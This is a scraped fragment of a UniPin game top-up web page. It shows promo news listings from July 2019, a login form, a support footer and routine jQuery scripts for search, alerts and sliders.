                                            <div class="news-item-label label label-default bg-gradient-blue">Promo</div>
                                            <ul class="news-social-list social-list pull-right">
                                                <li>
                                                    <a target="_blank" class="fa fa-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://www.unipin.com/article/detail/event/2019-07-19/top-up-now-and-get-70-bonus-uc"></a>
                                                </li>
                                                <li>
                                                    <a class="fa fa-link cursor-pointer" data-clipboard-text="https://www.unipin.com/article/detail/event/2019-07-19/top-up-now-and-get-70-bonus-uc"></a>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                                                            <div class="news-item-sizer">
                                    <div class="news-item">
                                        
                                        <a class="link-plain-f link-grey link-inline-block" href="https://www.unipin.com/article/detail/event/2019-07-19/top-up-pakai-go-pay-di-unipin-cashback-15">
                                            <img class="news-item-banner-img" src="https://storage.googleapis.com/unipin-assets/images/thumbnail_pages/1563524699-480x130-gopay-website.jpg" alt="Top Up pakai GO-PAY di UniPin Cashback 15%"/>
                                        </a>
                                        <div class="news-item-caption-container">
                                            <p class="news-item-caption">
                                                <b><a href="https://www.unipin.com/article/detail/event/2019-07-19/top-up-pakai-go-pay-di-unipin-cashback-15">Top Up pakai GO-PAY di UniPin Cashback 15%</a></b>
                                            </p>
                                            <span>19 Jul 2019</span>
                                            <p class="news-item-caption-description c-grey2">
                                                
                                                <span class="paragraph-end"></span>
                                            </p>
                                        </div>

                                        <div class="news-item-bottom">
                                            <div class="news-item-label label label-default bg-gradient-blue">Promo</div>
                                            <ul class="news-social-list social-list pull-right">
                                                <li>
                                                    <a target="_blank" class="fa fa-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://www.unipin.com/article/detail/event/2019-07-19/top-up-pakai-go-pay-di-unipin-cashback-15"></a>
                                                </li>
                                                <li>
                                                    <a class="fa fa-link cursor-pointer" data-clipboard-text="https://www.unipin.com/article/detail/event/2019-07-19/top-up-pakai-go-pay-di-unipin-cashback-15"></a>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                                                            <div class="news-item-sizer">
                                    <div class="news-item">
                                        
                                        <a class="link-plain-f link-grey link-inline-block" href="https://www.unipin.com/article/detail/event/2019-07-19/laplace-m-summer-fun-with-unipin-id">
                                            <img class="news-item-banner-img" src="https://storage.googleapis.com/unipin-assets/images/thumbnail_pages/1563527136-480x130-web-laplace-cover 960x320.jpg" alt="Laplace M Summer Fun with UniPin"/>
                                        </a>
                                        <div class="news-item-caption-container">
                                            <p class="news-item-caption">
                                                <b><a href="https://www.unipin.com/article/detail/event/2019-07-19/laplace-m-summer-fun-with-unipin-id">Laplace M Summer Fun with UniPin</a></b>
                                            </p>
                                            <span>19 Jul 2019</span>
                                            <p class="news-item-caption-description c-grey2">
                                                
                                                <span class="paragraph-end"></span>
                                            </p>
                                        </div>

                                        <div class="news-item-bottom">
                                            <div class="news-item-label label label-default bg-gradient-blue">Promo</div>
                                            <ul class="news-social-list social-list pull-right">
                                                <li>
                                                    <a target="_blank" class="fa fa-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://www.unipin.com/article/detail/event/2019-07-19/laplace-m-summer-fun-with-unipin-id"></a>
                                                </li>
                                                <li>
                                                    <a class="fa fa-link cursor-pointer" data-clipboard-text="https://www.unipin.com/article/detail/event/2019-07-19/laplace-m-summer-fun-with-unipin-id"></a>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                                                            <div class="news-item-sizer">
                                    <div class="news-item">
                                        
                                        <a class="link-plain-f link-grey link-inline-block" href="https://www.unipin.com/article/detail/event/2019-07-19/top-up-king-of-kings-di-unipin-pakelinkaja">
                                            <img class="news-item-banner-img" src="https://storage.googleapis.com/unipin-assets/images/thumbnail_pages/1563532473-480x130-King-of-Kings-960-x-320 edit.jpg" alt="Top up King of Kings di UniPin #pakeLinkAja"/>
                                        </a>
                                        <div class="news-item-caption-container">
                                            <p class="news-item-caption">
                                                <b><a href="https://www.unipin.com/article/detail/event/2019-07-19/top-up-king-of-kings-di-unipin-pakelinkaja">Top up King of Kings di UniPin #pakeLinkAja</a></b>
                                            </p>
                                            <span>19 Jul 2019</span>
                                            <p class="news-item-caption-description c-grey2">
                                                
                                                <span class="paragraph-end"></span>
                                            </p>
                                        </div>

                                        <div class="news-item-bottom">
                                            <div class="news-item-label label label-default bg-gradient-blue">Promo</div>
                                            <ul class="news-social-list social-list pull-right">
                                                <li>
                                                    <a target="_blank" class="fa fa-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https://www.unipin.com/article/detail/event/2019-07-19/top-up-king-of-kings-di-unipin-pakelinkaja"></a>
                                                </li>
                                                <li>
                                                    <a class="fa fa-link cursor-pointer" data-clipboard-text="https://www.unipin.com/article/detail/event/2019-07-19/top-up-king-of-kings-di-unipin-pakelinkaja"></a>
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                                                    </div>
                        <br />
                    </div>
                    <center>
                        <a href="https://www.unipin.com/article" class="btn btn-thumb-friendly btn-up-orange btn-block" style="">Lihat semua</a>
                    </center>
                    <div class="mb-40"></div>
                </section>

            </div>
        </div>
    </div>


        </main>
        
                    <div id="login_modal" class="modal fade" role="dialog">
                <div class="modal-dialog login-modal-dialog">
                    <div class="modal-content">
                        <div class="modal-header">
                            <button type="button" class="close" data-dismiss="modal">&times;</button>
                            <h4 class="modal-title">Masuk ke UniPin</h4>
                        </div>
                        <div class="modal-body">
                            <form method="POST" action="https://www.unipin.com/login" accept-charset="UTF-8" class="text-semibold row"><input name="_token" type="hidden" value="smYPfyn3QT1aijRgWsQoEXuxFM9rcrcsX2XObrDa">
                            <input type="hidden" name="popup" value="1">
                            <div class="col-xs-12">
                                <div class="field-wrap">
                                    <input class="jp-playlist-input" required id="loginEmailSide" placeholder="Email" name="email" type="email" value="">
                                </div>
                            </div>
                            <div class="col-xs-12">
                                <div class="field-wrap">
                                    <input class="jp-playlist-input" required autocomplete="off" id="loginPwdSide" placeholder="Kata Sandi" name="password" type="password" value="">
                                </div>
                                <a href="https://www.unipin.com/password" class="help-link pull-right" style="color: #777777;">Lupa kata sandi ?</a><br/>
                            </div>
                            <div class="col-xs-12">
                                <br/>
                                <div class="field-wrap text-center">
                                    <input class="btn btn-up-orange btn-radius-3 btn-md btn-block font-light mb-10" type="submit" value="Masuk">
                                    <a href="https://www.unipin.com/facebook/redirect" class="btn btn-fb btn-radius-3 btn-md btn-block font-light"><i class="fa fa-facebook-square"></i> &nbsp;Masuk Facebook</a><br/>

                                    <br />
                                    <a href="https://www.unipin.com/register" class=" cursor-pointer">Tidak punya akun? Daftar sekarang</a>
                                </div>
                            </div>

                            </form>
                        </div>
                    </div>
                </div>
            </div>
            </div>
        <footer class=" bg-gradient-orange">
    <div class="container">
        <div class="row">
            <p class="h3 footer-caption text-center">Customer Support</p>
                        <div class="footer-hotlinecallus-container col-xs-6 col-lg-4">
                <div class="row">
                    <div class="footer-hotline-container col-md-6">
                        <p class="footer-caption-2">Hotline</p>
                                                                                <div class="footer-phone">
                                <i class="fa fa-phone-square"></i>
                                                                    <a href="tel:6285959593535" style="color:#fff;">6285959593535</a><br />
                                                            </div>
                                                        <div class="footer-phone">
                                <i class="fa fa-phone-square"></i>
                                                                    <a href="tel:628128096565" style="color:#fff;">628128096565</a><br />
                                                            </div>
                                                                        </div>
                    <div class="col-md-6">
                        <p class="footer-caption-2">Call Center</p>
                                                                                    <div class="footer-phone">
                                    <i class="fa fa-phone-square"></i>
                                                                            <a href="tel:02122052055" style="color:#fff;">02122052055<br>(09.00 - 18.00 , Senin - Jum'at)</a><br />
                                                                    </div>
                                                                        </div>
                </div>
            </div>
                        <div class="footer-messageus-container col-xs-6 col-md-3 col-lg-4" >
                <p class="footer-caption-2">Message us</p>
                <div class="footer-messageus-item">
                                            <a href="mailto:cs.id@unipin.com" class="btn btn-up-white footer-button"><i class="fa fa-envelope"></i> cs.id@unipin.com</a><br />
                                    </div>
                <div class="footer-messageus-item">
                                            <a href="https://www.unipin.com/support" target="_blank" class="btn btn-up-white footer-button"><i class="fa fa-comment-alt"></i> Livechat Messenger</a><br />
                                    </div>
                <div class="footer-messageus-item">
                                            <a href="https://m.me/VoucherUniPin" target="_blank" class="btn btn-up-facebook footer-button"><i class="fa fa-facebook"></i> <span style="font-size:12px;">Facebook Messenger</span></a><br />
                                    </div>
            </div>
                            <div class="footer-whatsapp-container col-xs-12 col-md-3 col-lg-4">
                    <p class="footer-caption-2"> Whatsapp (Chat only)</p>
                                                                        <div class="footer-messageus-item">
                                                                    <a class="footer-button btn btn-up-green" target="_blank" href="https://api.whatsapp.com/send?phone=628111008988"><i class="fa fa-whatsapp"></i> 628111008988<br/><small>(09:00 - 02:00 WIB)</small><br /></a><br />
                                                            </div>
                                                    <div class="footer-messageus-item">
                                                                    <a class="footer-button btn btn-up-green" target="_blank" href="https://api.whatsapp.com/send?phone=628128096565"><i class="fa fa-whatsapp"></i> 628128096565<br/><small>(02:00 - 09:00 WIB)</small><br /></a><br />
                                                            </div>
                                                            </div>
                    </div>
    </div>
    <div class="footer-social-media bg-black-2">
        <div class="container">
            <div class="row">
                <div class="col-md-3">
                    <div class="footer-blackline-container">
                        <span class="h4" style="margin:0px">Follow us</span>
                    </div>
                </div>
                <div class="col-md-6">
                    <div class="footer-blackline-container">
                                                <a target="_blank" class="footer-socialmedia-icon" href="https://www.facebook.com/VoucherUniPin">
                            <div class="footer-socialmedia-wrap bg-facebook">
                                <i class="fa fa-facebook-f"></i>
                            </div>
                        </a>
                                                                        <a target="_blank" class="footer-socialmedia-icon" href="https://twitter.com/unipin24jam">
                            <div class="footer-socialmedia-wrap bg-twitter">
                                <i class="fa fa-twitter"></i>
                            </div>
                        </a>
                                                                        <a target="_blank" class="footer-socialmedia-icon" href="https://line.me/ti/p/~@UniPin">
                            <div class="footer-socialmedia-wrap bg-line">
                                <i class="fa fa-comment"></i>
                            </div>
                        </a>
                                                                        <a target="_blank" class="footer-socialmedia-icon" href="https://www.youtube.com/channel/UClINXntvfPr_44coZpObmDA">
                            <div class="footer-socialmedia-wrap bg-youtube">
                                <i class="fa fa-youtube"></i>
                            </div>
                        </a>
                                                                        <a target="_blank" class="footer-socialmedia-icon" href="https://www.instagram.com/unipinindonesia/">
                            <div class="footer-socialmedia-wrap bg-instagram">
                                <i class="fa fa-instagram"></i>
                            </div>
                        </a>
                                                                                    <a target="_blank" class="footer-socialmedia-icon" href="https://www.upstation.asia">
                                    <div class="footer-socialmedia-wrap" style="background: #f06c40">
                                        <img src="https://www.unipin.com/images/UP-icon-white-plain.png" width="20px">
                                    </div>
                                </a>
                                                </div>
                </div>
                <div class="col-md-3">
                    <div class="footer-blackline-container" style="display: inline;">
                        &copy; 2019 UniPin. All Rights Reserved <br />
                        <small>(<a style="color: #ffffff" href="https://www.unipin.com/terms-and-conditions">Syarat dan ketentuan</a>)</small>
                    </div>
                </div>
            </div>
        </div>
    </div>
</footer>

<div class="bottombar-outter-container">
    <div class="row">
        <div class="container">
            <div class="bottombar-inner-container">
                <div class="bottombar-items">
                    <a href="https://www.unipin.com">
                        <img class="bottombar-icon" src="https://www.unipin.com/images/bot-homeicon.png">
                        <div class="bottombar-label">Home</div>
                    </a>
                </div>
                <div class="bottombar-items">
                    <a href="https://www.unipin.com/article">
                        <img class="bottombar-icon" src="https://www.unipin.com/images/bot-promoicon.png">
                        <div class="bottombar-label">Promo News</div>
                    </a>
                </div>
                <div class="bottombar-items">
                    <a href="https://www.unipin.com/games/all">
                        <img class="bottombar-icon" src="https://www.unipin.com/images/bot-gameicon.png">
                        <div class="bottombar-label">Games</div>
                    </a>
                </div>
                <div class="bottombar-items">
                    <a href="https://www.unipin.com/rewards">
                        <img class="bottombar-icon" src="https://www.unipin.com/images/bot-rewardicon.png">
                        <div class="bottombar-label">Rewards</div>
                    </a>
                </div>
                <div class="bottombar-items">
                                        <a href="#" data-target="#login_modal" data-toggle="modal">
                        <img class="bottombar-icon" src="https://www.unipin.com/images/bot-usericon.png">
                        <div class="bottombar-label">Login</div>
                    </a>
                                    </div>
            </div>
        </div>
    </div>
</div>
    </div>
<script type="text/javascript">
    // Zendesk Mobile Widget Positioning
    window.zESettings = {
      webWidget: {
        offset: {
          mobile: {
            horizontal: '-13px',
            vertical: '60px'
          }
        }
      }
    };
    </script>
<script src="js/app.v2.js?id=a2e1541c6e50f011a361" type="text/javascript"></script>
<!-- jquery validate localization-->
    <script src="https://www.unipin.com/js/jquery-validate/localization/messages_id.js" type="text/javascript"></script>
<!-- end jquery validate localization-->
<script>
    jQuery.validator.setDefaults({
        submitHandler: function(form) {
            $(form).find('input[type=submit]').prop("disabled", true);
            $(form).find('input[type=submit]').val("Mengolah...");
            $("body").css("cursor", "progress");
            form.submit();
        },
        errorClass: 'input-error'
    });

    function channel_maintaining() {
        $.alert({
            title: 'Ops!',
            content: 'Channel ini sedang dalam perbaikan, Mohon maaf atas ketidaknyamanan yang terjadi.',
            escapeKey: true,
            backgroundDismiss: true
        });
    }

    function channel_not_support() {
        $.alert({
            title: 'Ops!',
            content: 'Channel ini tidak tersedia, harap isi ulang menggunakan channel lain. Mohon maaf atas ketidaknyamanan yang terjadi.',
            escapeKey: true,
            backgroundDismiss: true
        });
    }

    function ofs_alert() {
        $.alert({
            title: 'Ops!',
            content: 'Denominasi isi sedang habis, kami akan menambahkan stok secepatnya. Mohon maaf atas ketidaknyamanan yang terjadi.',
            escapeKey: true,
            backgroundDismiss: true
        });
    }

    /*function goToNext(id){
        $('#'+id).focus();
        checkSerial1();
    }

    function checkSerial1(){
        if($('#serial_1').val().trim()!=''){
            goToNext('serial_2');
        }
        $('#serial_1').val('');
    }*/

    $('.input-date').datetimepicker({
        format: 'DD/MM/YYYY'
    });

    $('.input-time').datetimepicker({
        format: 'HH:mm'
    });

    if ( $( ".footable" ).length ) {
        $(function () {
            $('.footable').footable();
        });
    }

    if ( $( ".autotab-number" ).length ) {
        $('.autotab-number').autotab('number');
    }

    lazyload();

    $(document).mouseup(function(e)
    {
        var container = $(".panel-payment-channels");
        if (!container.is(e.target) && container.has(e.target).length === 0) {
            container.hide();
        }
    });

    $("a[href='#bottom']").click(function() {
        $("html, body").animate({ scrollTop: $(document).height() });
        return false;
    });

    $(document).ready(function () {

        function checkForButtonDraw() {
            function isOverflown(element) {return element.scrollHeight > element.clientHeight;}

            if (isOverflown(document.getElementById("id-payment-otheritem-container"))) {
                $("#other-product-trigger").show();
            } else {
                $("#other-product-trigger").hide();
            }
        }

        if ($('#id-payment-otheritem-container').length) {
            document.querySelector('#other-product-trigger').addEventListener('click', function() {
                document.querySelector('#id-payment-otheritem-container.collapsible').classList.toggle('collapsing');
                $("#other-product-trigger").hide();
                console.log("morebuttontriggered");
            });

            checkForButtonDraw();

            var resizeTimeout;
            $(window).resize(function() {
                if (!!resizeTimeout) { clearTimeout(resizeTimeout); }
                resizeTimeout = setTimeout(function() {
                    checkForButtonDraw();
                    console.log('redrawed');
                }, 200);
            });
        }

        $('[data-toggle="tooltip"]').tooltip({
            content: function () {
                return this.getAttribute("title");
            },
            animated: 'fade',
            html: true
        });

        $('.drawer').drawer();

        $(".searchbar-trigger").click(function() {
            $("#searchbar-container").slideToggle("fast", function() {
                // Animation complete.
                $("#search_input").focus();
            });
        });

        $('.flex-control-paging').addClass('hide');

        $(".language-dropdown-trigger").click(function() {
            $("#language-dropdown-container").slideToggle("fast", function() {
                // Animation complete.
            });
        });

        $(".dl-submenu").each(function(){
            var $this = $(this);
            $this.prepend('<li class="gobackLvl"><a class="backLvl" href="#"><i class="fa fa-long-arrow-left"></i>Kembali</li>');
        });

        $.jGrowl.defaults.closerTemplate = '<div>sembunyikan semua notifikasi</div>';

        
            });

</script>


<script type="text/javascript">
    $(document).ready(function(){
        $.ajaxSetup({
            headers: {
                'X-CSRF-TOKEN': 'smYPfyn3QT1aijRgWsQoEXuxFM9rcrcsX2XObrDa'
            }
        });

        $("#search_input").autocomplete({
            source: function( request, response ) {
                $.ajax( {
                    url: "https://www.unipin.com/games/search",
                    dataType: 'json',
                    method: 'post',
                    data: {
                        term: request.term
                    },
                    success: function( data ) {
                        response( data );
                    }
                } );
            },
            minLength: 3,
            delay: 500,
            select: function( event, ui ) {
                window.location.href = ui.item.url;
            },
            response: function( event, ui ) {
                ui.content.push({url:"https://www.unipin.com/games/search?search=" + sanitarize($("#search_input").val()), image:0, title:"Cari Kata Kunci " + sanitarize($("#search_input").val()) + " >>>", gp:""});
            }
        }).data( "ui-autocomplete" )._renderItem = function( ul, item ) {
            var inner_html = '<a href="' + item.url + '" class="list_item_container" ><img src="' + item.image + '" ><span>' + item.title + '</span><br /><small>'+item.gp+'</small></a>';
            return $( "<li></li>" )
                .data( "item.autocomplete", item )
                .append(inner_html)
                .appendTo( ul );
        };
    });

    function sanitarize(string) {
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            "/": '&#x2F;',
        };
        const reg = /[&<>"'/]/ig;
        return string.replace(reg, (match)=>(map[match]));
    }
</script>    <script>
        jQuery(function($){
            'use strict';
            (function () {
                var $frame = $('.slyScroll');
                $frame.show();
                $frame.sly({
                    horizontal: 1,
                    itemNav: 'basic',
                    smart: 1,
                    activateOn: 'click',
                    mouseDragging: 1,
                    touchDragging: 1,
                    releaseSwing: 1,
                    startAt: 0,
                    scrollBy: 1,
                    speed: 300,
                    elasticBounds: 1,
                    easing: 'easeOutExpo',
                    dragHandle: 1,
                    dynamicHandle: 1
                });
            }());

//            SyntaxHighlighter.all();
        });

        $(window).load(function () {
            $('.flexslider').flexslider({
                animation: "slide",
                start: function (slider) {
                    $('body').removeClass('loading');
                }
            });
        });

        var clipboard = new Clipboard('.fa-link');
        clipboard.on('success', function (e) {
            $.jGrowl("Link artikel disalin!");
        });
    </script>
</body>
</html>
